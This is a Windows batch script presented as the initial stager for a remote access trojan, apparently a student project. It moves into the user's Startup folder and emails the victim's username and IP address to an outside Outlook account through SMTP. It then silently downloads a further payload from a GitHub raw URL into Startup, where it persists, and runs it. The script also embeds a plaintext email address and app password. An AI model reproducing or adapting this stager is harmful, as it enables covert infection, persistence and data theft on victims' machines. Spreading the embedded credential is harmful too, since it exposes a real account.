
@REM @echo off
@REM initial stager for RAT
@REM created by : Luke O'Sullivan

@REM variables
set "initialPath=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@REM move into startup directory
cd %STARTUP%

@REM Set up SMTP
powershell -Command $email = "fyp22356827@outlook.com"; $appPassword = "qbpyymmalyudxsur"; $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet -ErrorAction SilentlyContinue).IPAddress | Out-String; $subject = "$env:UserName logs"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.office365.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $appPassword); $smtp.Send($email, $email, $subject, $ip);


@REM writeS payload to startup
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wget.cmd -OutFile wget.cmd"


@REM run payload placeholder
powershell ./wget.cmd


@REM cd %initialPath%
@REM del init.cmd
